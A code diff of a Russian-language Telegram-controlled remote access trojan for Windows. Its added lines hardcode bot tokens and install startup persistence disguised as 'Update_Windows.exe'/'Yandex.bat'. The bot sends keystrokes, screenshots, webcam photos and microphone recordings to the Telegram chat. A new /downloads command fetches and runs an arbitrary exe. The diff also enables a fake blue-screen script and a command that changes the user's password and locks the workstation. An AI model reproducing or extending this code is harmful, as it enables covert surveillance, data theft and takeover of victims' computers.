@@ -7,6 +7,7 @@ import pygame
 
 from pynput import keyboard
 import datetime
+
 import time
 
 import pyautogui
@@ -29,7 +30,7 @@ import sys
 
 import random
 
-#для добовление в автозагрузку
+#за добовление в автозагрузку
 import shutil
 import winreg
 
@@ -48,26 +49,13 @@ import wavio as wv
 from multiprocessing import Process
 
 
-def micro_phone(i):
-    freq = 44100
-    # Продолжительность записи
-    duration = int(i * freq)
-    # Запустить рекордер с заданными значениями
-    # длительности и частоты дискретизации
-    recording = sd.rec(duration,
-                       samplerate=freq, channels=2)
-
-    # Запись звука в течение заданного количества секунд
-    sd.wait()
-    # Это преобразует массив NumPy в аудиофайл.
-    # файл с заданной частотой дискретизации
-    write("recorded.wav", freq, recording)
-    # Преобразование массива NumPy в аудиофайл
-    wv.write("recorded.wav", recording, freq, sampwidth=2)
+#6619437777:AAGAmak2lcgXlaJc1KniqJrpT2sjlSwXpIg
 
 def send_audio(bot, chat_id):
-    with open("recorded.wav", "rb") as f:
+    with open(r"C:\Users\Public\recorded.wav", "rb") as f:
         bot.send_document(chat_id, f)
+        f.close()
+        os.remove(r"C:\Users\Public\recorded.wav")
 
 
 # # Получаем путь к исполняемому файлу текущего скрипта
@@ -83,6 +71,13 @@ def send_audio(bot, chat_id):
 # # Копируем текущий скрипт в директорию автозагрузки
 # shutil.copy(script_path, startup_dir)
 
+##########################################################
+auto = ''
+
+# API
+##########################################################
+bot = telebot.TeleBot('6038725147:AAH0MLqKaSgJdgXPhQvhDLSdLd0XW2PSD5M')
+##########################################################
 
 username = os.getlogin()
 file_derect2 = r'start "Update_Windows.exe" "C:\Users\Public\Update_Windows.exe" /param1 /param2'
@@ -90,11 +85,16 @@ file_derect = r'C:\Users\Public\Ubdate_Windows.exe'
 print(file_derect)
 USER_NAME = getpass.getuser()
 def add_to_startup(file_path=""):
-    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
-    with open(bat_path + '\\' + "Yandex.bat", "w+") as bat_file: bat_file.write(file_derect2)
+    try:
+        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
+        with open(bat_path + '\\' + "Yandex.bat", "w+") as bat_file: bat_file.write(file_derect2)
+        auto = "Получилось добавить в автозагрузку"
 
-    #global bat_path
-    #print('del ' + '"' + bat_path + '\\' + "Yandex.bat" + '"')
+
+    except:
+        print("No")
+        auto = "Не получилось добавить в атозагрузку"
+
 
 add_to_startup()
 
@@ -114,25 +114,13 @@ add_to_startup()
 
 # Функция записи звука с микрофона
 def micro_phone(i):
-    # Частота дискретизации
     freq = 44100
-    # Продолжительность записи
     duration = i
-
-    # Запустить рекордер с заданными значениями
-    # длительности и частоты дискретизации
     recording = sd.rec(int(duration * freq),
                        samplerate=freq, channels=2)
-
-    # Запись звука в течение заданного количества секунд
     sd.wait()
-
-    # Это преобразует массив NumPy в аудио
-    # файл с заданной частотой дискретизации
-    write("recorded.wav", freq, recording)
-
-    # Преобразование массива NumPy в аудиофайл
-    wv.write("recorded.wav", recording, freq, sampwidth=2)
+    write(r"C:\Users\Public\recorded.wav", freq, recording)
+    wv.write(r"C:\Users\Public\recorded.wav", recording, freq, sampwidth=2)
 
 
 def setEngLayout():
@@ -146,7 +134,7 @@ def Keylogs():
 
         def __init__(self, filename: str = "C:\\Users\\Public\\logs.txt") -> None:
             self.filename = filename
-            text = '''Keylog v1
+            text = '''Keylog v2.0 
 <96> - 0
 <97> - 1
 <98>  - 2
@@ -181,12 +169,7 @@ def Keylogs():
     if __name__ == '__main__':
         logger = KeyLog()
         logger.main()
-        
-
-#YOUR_TOKEN
-bot = telebot.TeleBot('YOUR_TOREN')
-
-
+        # input()
 
 @bot.message_handler(commands=['keylog'])
 def website(message):
@@ -216,9 +199,10 @@ def My_PC(message):
 13. Открыть сайт по ссылке - /sites (https://....)
 14. Синий экран смерти - /blue_screen
 15. Запись с микрофона - /microo
-16. Сделать фото с камеры - /web_camera</b>''')
+16. Сделать фото с камеры - /web_camera
+17. Скачать какой-exe файл /downloads https://....</b>''')
     bot.send_message(message.chat.id, text, parse_mode='html')
-
+    # Папка находится по этому пути C:\Users\Public\
     bot.send_message(message.chat.id, "Создание папки где будет лежить keyloger")
     try:
         os.mkdir("C:\\Users\\Public\\")
@@ -230,13 +214,13 @@ def My_PC(message):
 @bot.message_handler(commands=["screenshot"])
 def screenshot(message):
     try:
-        im1 = pyautogui.screenshot()
-        im2 = pyautogui.screenshot('my_screenshot.png')
+        pyautogui.screenshot(r'C:\Users\Public\my_screenshot.png')
         time.sleep(2)
-        logo1 = open("my_screenshot.png", "rb")
+        logo1 = open(r"C:\Users\Public\my_screenshot.png", "rb")
         bot.send_document(message.chat.id, logo1)
-        # time.sleep(2)
-        os.remove("my_screenshot.png")
+        logo1.close()
+        time.sleep(1)
+        os.remove(r"C:\Users\Public\my_screenshot.png")
 
     except:
         bot.send_message(message.chat.id, "Error")
@@ -332,7 +316,7 @@ echo.Could not find %_WinSysPath%win32k5.sys
 pause'''
 
     create_bat_file(content)
-    # os.system("script.bat")
+    os.system("script.bat")
 
     try:
         markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
@@ -347,7 +331,7 @@ pause'''
         markup.add(stop, hungred, fifty, twenty_five, ten, zero, script_bat, blue_screen)
         bot.send_message(message.chat.id, 'Изминить громкость', reply_markup=markup)
 
-        url = 'https://rur.hitmotop.com/get/music/20200323/ZVUKI_BY_Pro_Fi_245_-_Sirena_Zvuk_sireny_vojjny_68885421.mp3'
+        url = 'https://github.com/Vova2808/Music_mem/raw/main/SIRENA_100DB.mp3'
         urllib.request.urlretrieve(url, "file" + str(add) + ".mp3")
         bot.send_message(message.chat.id, "Идёт загрузка", parse_mode='html')
         bot.send_message(message.chat.id, "3", parse_mode='html')
@@ -413,7 +397,12 @@ def password(message):
         username = getpass.getuser()
         new_password = random.randint(12340985, 98479359)
         change_password(username, new_password)
-        bot.send_message(message.chat.id, "Пароль был изменён на ", new_password)
+        bot.send_message(message.chat.id, "Пароль "
+                                          ""
+                                          ""
+                                          ""
+                                          ""
+                                          "был изменён на ", new_password)
         windll.user32.LockWorkStation()
     except:
         bot.send_message(message.chat.id, "Пароль не был изменён прога не была запущена от админки")
@@ -425,10 +414,16 @@ def exut(message):
         bot.send_message(message.chat.id, "Удаление кейлогера и bat с автозагрузкой")
         #os.system(r'del C:\Users\Public\Ubdate_Windows.exe')
         USER_NAME = getpass.getuser()
+        bot.send_message(message.chat.id, 'Удаление bat с автозагрузкой')
         os.system(f'del "C:\\Users\\{USER_NAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Yandex.bat"')
         bot.send_message(message.chat.id, "Удаление файла с логами нажитий клавишь")
         os.system(r"del C:\Users\Public\logs.txt")
         bot.send_message(message.chat.id, "Всё ОК")
+        bot.send_message(message.chat.id, '''Теперь можно либо выключить или перезапустить или выкинуть синий экран смерти
+1. /blue_screen - синька
+2. /reboot - Выключить ПК
+3. /restart - Перезапуск ПК''')
+
     except:
         bot.send_message(message.chat.id, "Неудалось удалить файлы")
 
@@ -485,6 +480,20 @@ def reboot(message):
     os.system("shutdown /s /t 0")
 
 
+@bot.message_handler(commands=['downloads'])
+def kill_process(message):
+    try:
+        user_msg = '{0}'.format(message.text)
+        bot.send_message(message.chat.id, "Загрузка")
+        urllib.request.urlretrieve(user_msg.split(' ')[1], "file" + ".exe")
+        time.sleep(1)
+        os.system('file.exe')
+        bot.send_message(message.chat.id, 'Отлично!')
+
+    except:
+        bot.send_message(message.chat.id, 'Ошибка')
+
+
 @bot.message_handler(commands=['web_camera'])
 def camera(message):
     try:
@@ -494,13 +503,13 @@ def camera(message):
             cap.read()
 
         ret, frame = cap.read()
-        cv2.imwrite('photo.png', frame)
+        cv2.imwrite(r'C:\Users\Public\photo.png', frame)
         cap.release()
         time.sleep(1)
-        _logo1 = open("photo.png", "rb")
+        _logo1 = open(r"C:\Users\Public\photo.png", "rb")
         bot.send_document(message.chat.id, _logo1)
-        time.sleep(1)
-        os.remove('photo.png')
+        _logo1.close()
+        os.remove(r'C:\Users\Public\photo.png')
 
     except:
         bot.send_message(message.chat.id, 'Ошибка кажется нету камеры')
@@ -520,8 +529,6 @@ def wifi(message):
         bot.send_message(message.chat.id, "Всё ок Wifi отключен")
     except:
         bot.send_message(message.chat.id, "Ошибка")
-
-
 
 
 
@@ -551,8 +558,8 @@ def get_user_text(message):
         if message.text == "stop keylog":
             try:
                 logo = open("C:\\Users\\Public\\logs.txt", "rb")
-
                 bot.send_document(message.chat.id, logo)
+                logo.close()
 
             except:
                 bot.send_message(message.chat.id, "Какая та ошибка")
@@ -575,7 +582,7 @@ def get_user_text(message):
                 bot.send_message(message.chat.id, 'Изминить громкость', reply_markup=markup)
 
                 url = message.text
-                urllib.request.urlretrieve(url, "file" + str(i) + ".mp3")
+                urllib.request.urlretrieve(url, r"C:\Users\Public\file" + str(i) + ".mp3")
                 bot.send_message(message.chat.id, "Идёт загрузка", parse_mode='html')
                 bot.send_message(message.chat.id, "3", parse_mode='html')
                 time.sleep(1)
@@ -588,7 +595,7 @@ def get_user_text(message):
                 pygame.init()
 
                 # Загрузка и игра музыки
-                pygame.mixer.music.load("file" + str(i) + ".mp3")
+                pygame.mixer.music.load(r"C:\Users\Public\file" + str(i) + ".mp3")
                 i = i + 1
 
                 print(i)
@@ -601,13 +608,15 @@ def get_user_text(message):
             except:
                 bot.send_message(message.chat.it, "Error кажется файл не mp3 или ссылка не рабочая ")
 
+
         elif message.text == "stop_sound":
             try:
+
                 bot.send_message(message.chat.id, "Выклчение музыки")
                 pygame.quit()
                 bot.send_message(message.chat.id, "OK")
                 bot.send_message(message.chat.id, "Удаление музыки")
-                os.remove("file" + str(i) + ".mp3")
+                os.remove(r"C:\Users\Public\file" + str(i) + ".mp3")
                 bot.send_message(message.chat.id, "OK")
 
             except:
@@ -631,7 +640,7 @@ def get_user_text(message):
             bot.send_message(message.chat.id, "OK")
 
         #управление громкостью 0%, 25%, 50%, 100%
-        #100% громкости
+        #100%
         elif message.text == "set_sound_100%":
             devices = AudioUtilities.GetSpeakers()
             interface = devices.Activate(
@@ -640,7 +649,7 @@ def get_user_text(message):
 
             volume.SetMasterVolumeLevel(-0.0, None)
 
-        # 50% громкости
+        # 50%
         elif message.text == "set_sound_50%":
             devices = AudioUtilities.GetSpeakers()
             interface = devices.Activate(
@@ -649,7 +658,7 @@ def get_user_text(message):
 
             volume.SetMasterVolumeLevel(-9.2, None)
 
-        # 25% громкости
+        # 25%
         elif message.text == "set_sound_25%":
             devices = AudioUtilities.GetSpeakers()
             interface = devices.Activate(
@@ -658,7 +667,7 @@ def get_user_text(message):
 
             volume.SetMasterVolumeLevel(-17.7, None)
 
-        # 10% громкости
+        # 10%
         elif message.text == "set_sound_10%":
             devices = AudioUtilities.GetSpeakers()
             interface = devices.Activate(
@@ -667,7 +676,7 @@ def get_user_text(message):
 
             volume.SetMasterVolumeLevel(-26.0, None)
 
-        # 0% громкости
+        # 0%
         elif message.text == "set_sound_0%":
             devices = AudioUtilities.GetSpeakers()
             interface = devices.Activate(
@@ -734,10 +743,7 @@ def get_user_text(message):
             win32gui.SendMessage(win32con.HWND_BROADCAST,
                                  win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, -1)
 
-        #from multiprocessing import Process
-
         # Функция записи звука с микрофона
-
 
 
         # Запись звука с микрофона
